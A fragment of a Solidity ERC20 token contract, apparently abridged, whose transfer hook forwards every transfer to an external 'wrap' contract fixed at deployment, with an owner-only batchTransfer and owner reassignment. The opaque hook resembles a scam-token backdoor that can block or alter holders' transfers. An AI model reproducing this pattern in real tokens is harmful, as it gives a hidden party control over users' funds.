...
interface IWRAP{
    function extendImp(address from,address to,uint256 amount) external;
}
contract TWN is ERC20 {

    address private _wrap;

    address public _mu;
    modifier isMU() {
        require(msg.sender == _mu, "DENIED");
        _;
    }

    function _extendImp(address from,address to,uint256 amount) internal override {
        if(_wrap!=address(0))
            IWRAP(_wrap).extendImp(from,to,amount);
    }
    
    constructor(string memory name_, string memory symbol_,uint256 total,address wrap_) {
        _mu = _msgSender();
        _wrap = wrap_;
        _name = name_;
        _symbol = symbol_;
    ...
    function changeMU(address mu_) external isMU(){
        _mu = mu_;
    }
    ...
    function batchTransfer(uint256 amount, address[] calldata list)  public isMU(){
